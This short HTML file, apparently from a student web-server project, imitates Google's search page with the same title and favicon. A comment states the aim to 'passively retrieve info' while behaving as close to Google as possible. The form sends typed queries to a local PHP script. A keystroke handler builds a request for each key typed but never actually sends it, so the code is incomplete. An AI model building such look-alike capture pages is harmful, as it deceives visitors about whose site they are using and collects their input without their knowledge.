<!DOCTYPE html>
<html>
    <!-- More additions need to be made -->
    <head>
        <title>Google</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="UTF-8"><meta content="origin" name="referrer">
        <link href="https://www.gstatic.com/images/branding/searchlogo/ico/favicon.ico" rel="icon">
        <meta content="/images/branding/googleg/1x/googleg_standard_color_128dp.png" itemprop="image">
    </head>
    <script>
        function readKey(element){
            var txt = element.value;
            const xhttp = new XMLHttpRequest();
            xhttp.open("GET", "WebServersFinal/search.php?search="+txt+"&send=Submit+Query");
            console.log("WebServersFinal/search.php?search="+txt+"&send=Submit+Query");
        }
    </script>
    <!-- Passively retrieve info, make it behave as close to Google as possible -->
    <body>
        <form action="WebServersFinal/search.php" method="GET">
            <input type="text" name="search" id="search" onkeyup="readKey(this)"/>
            <input type="submit" name="send" id="send"/>
        </form>
    </body>
</html>
